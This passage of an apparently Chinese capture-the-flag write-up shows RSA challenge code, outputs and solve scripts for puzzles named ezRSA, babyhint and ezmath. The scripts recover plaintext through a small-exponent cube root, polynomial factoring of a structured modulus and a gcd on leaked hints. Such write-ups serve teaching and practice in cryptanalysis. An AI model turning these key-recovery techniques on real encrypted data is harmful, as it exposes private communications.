23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>hint2 = 963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#小明文攻击</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token number\">23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token number\">963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">keygen</span><span class=\"token punctuation\">(</span>nbit <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> getRandomNBitInteger<span class=\"token punctuation\">(</span>nbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tp <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tq <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span> q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> keygen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>enc <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>n = 1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>enc = 1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>k<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>n0 <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> n0</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sol <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(sol)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>x <span class=\"token operator\">=</span> sol<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">=</span> p<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q <span class=\"token operator\">=</span> q<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"babyhint\"><a class=\"markdownIt-Anchor\" href=\"#babyhint\">#</a> babyhint</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>hint2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint1=\"</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint2=\"</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c=\"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hint1= 83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>hint2= 14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n= 94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c= 84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>h1<span class=\"token operator\">=</span> <span class=\"token number\">83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h2<span class=\"token operator\">=</span> <span class=\"token number\">14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>kq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h2<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h1<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>kq<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">//</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezmath</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span> <span class=\"token operator\">*</span> p <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'hint=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hint<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>n=16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>c=7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>hint=14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token 